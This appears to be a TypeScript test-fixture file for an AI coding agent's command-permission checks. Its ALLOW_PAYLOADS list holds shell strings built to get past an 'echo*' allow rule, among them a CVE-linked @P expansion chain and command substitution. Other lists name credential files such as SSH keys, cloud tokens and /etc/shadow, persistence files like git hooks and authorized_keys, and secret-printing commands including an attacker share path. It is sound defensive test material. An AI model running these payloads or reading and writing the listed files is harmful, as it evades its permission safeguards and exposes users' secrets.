/** Allow-rule bypass payloads and path lists, from the same sources as denyVariants.ts. */

export const ALLOW_ECHO = { allow: ["runTerminalCommand(echo*)"] };

/**
 * [label, command, permissions, mustNotBeRuleAllowed].
 * mustNotBeRuleAllowed = true means an allow rule applying here is a hole.
 */
export const ALLOW_PAYLOADS: [string, string, any, boolean][] = [
  ["control", "echo hello", ALLOW_ECHO, false],
  [
    "CVE-2025-66032 #8: @P chain",
    'echo ${one="$"}${two="$one(touch /tmp/pwned)"}${two@P}',
    ALLOW_ECHO,
    true,
  ],
  ["@P modifier", "echo ${x@P}", ALLOW_ECHO, true],
  ["assign-default expansion", "echo ${x:=y}", ALLOW_ECHO, true],
  ["assign-default with substitution", "echo ${x:=$(id)}", ALLOW_ECHO, true],
  ["IFS variable", "echo $IFS", ALLOW_ECHO, true],
  ["plain variable", "echo $HOME", ALLOW_ECHO, false],
  ["plain braces", "echo ${HOME}", ALLOW_ECHO, false],
  ["redirect to file", "echo hi > out.txt", ALLOW_ECHO, true],
  ["zsh clobber >|", "echo hi >| out.txt", ALLOW_ECHO, true],
  ["&> redirect", "echo hi &> out.txt", ALLOW_ECHO, true],
  ["2> redirect", "echo hi 2>out.txt", ALLOW_ECHO, true],
  ["process substitution", "echo <(id)", ALLOW_ECHO, true],
  ["newline chain", "echo hi\nid", ALLOW_ECHO, true],
  ["&& chain", "echo hi && id", ALLOW_ECHO, true],
  ["pipe to tee", "echo hi | tee /tmp/x", ALLOW_ECHO, true],
  ["command substitution", "echo $(id)", ALLOW_ECHO, true],
  ["backticks", "echo `id`", ALLOW_ECHO, true],
  ["tilde path", "echo ~/.ssh/id_rsa", ALLOW_ECHO, true],
];

/** Credential locations. true = we must treat reading it as secret. */
export const SECRET_READS: [string, boolean][] = [
  [".env", true],
  ["app/.ENV", true],
  [".env.local", true],
  [".env.example", false],
  ["~/.aws/credentials", true],
  ["~/.ssh/id_rsa", true],
  ["~/.gnupg/x", true],
  ["~/.kube/config", true],
  [".npmrc", true],
  [".netrc", true],
  ["~/.git-credentials", true],
  ["~/.config/gh/hosts.yml", true],
  ["~/.docker/config.json", true],
  ["~/.azure/accessTokens.json", true],
  ["~/.config/gcloud/credentials.db", true],
  ["~/.terraform.d/credentials.tfrc.json", true],
  ["~/.pgpass", true],
  ["~/.my.cnf", true],
  ["prod.tfvars", true],
  ["terraform.tfstate", true],
  ["server.pem", true],
  ["private.key", true],
  ["cert.pfx", true],
  ["/etc/shadow", true],
  ["/proc/self/environ", true],
  ["src/index.ts", false],
  ["README.md", false],
  ["docs/keys.md", false],
  ["key.ts", false],
  ["monkey.png", false],
];

/** Files that change what runs later (or configure an agent). true = writes must ask. */
export const CONFIG_WRITES: [string, boolean][] = [
  [".git/hooks/pre-commit", true],
  [".github/workflows/ci.yml", true],
  [".vscode/tasks.json", true],
  [".continue/config.yaml", true],
  [".continuerc.json", true],
  [".continuerc.yaml", true],
  [".husky/pre-commit", true],
  [".envrc", true],
  [".devcontainer/devcontainer.json", true],
  [".idea/workspace.xml", true],
  [".cargo/config.toml", true],
  [".config/git/config", true],
  [".mcp.json", true],
  [".cursor/mcp.json", true],
  [".claude/settings.json", true],
  // Deliberately not protected: instruction files are edited constantly, and a
  // rule can add them (writeFile(AGENTS.md) under toolPermissions.ask).
  [".clinerules", false],
  ["AGENTS.md", false],
  [".github/copilot-instructions.md", false],
  [".gitattributes", false],
  [".gitmodules", false],
  ["~/.bashrc", true],
  ["~/.zshrc", true],
  ["~/.gitconfig", true],
  ["~/.config/fish/config.fish", true],
  ["~/Library/LaunchAgents/x.plist", true],
  ["~/.ssh/authorized_keys", true],
  ["src/app.ts", false],
  ["README.md", false],
  [".github/CODEOWNERS", false],
  [".gitignore", false],
  ["docs/hooks.md", false],
];

/** Commands that print or send credentials without naming a secret file. true = must ask. */
export const SECRET_COMMANDS: [string, boolean][] = [
  ["cat /proc/self/environ", true],
  ["dir env:", true],
  ["echo %AWS_SECRET_ACCESS_KEY%", true],
  ["echo $AWS_SECRET_ACCESS_KEY", true],
  ["printenv AWS_SECRET_ACCESS_KEY", true],
  ["env", true],
  ["printenv", true],
  ["cat terraform.tfstate", true],
  ["cat prod.tfvars", true],
  ["ls \\\\attacker\\share", true],
  ["head \\\\attacker\\share\\file", true],
  ["echo hello", false],
  ["ls", false],
  ["git status", false],
  ["npm test", false],
  ["echo $HOME", false],
  ["echo 50%", false],
];
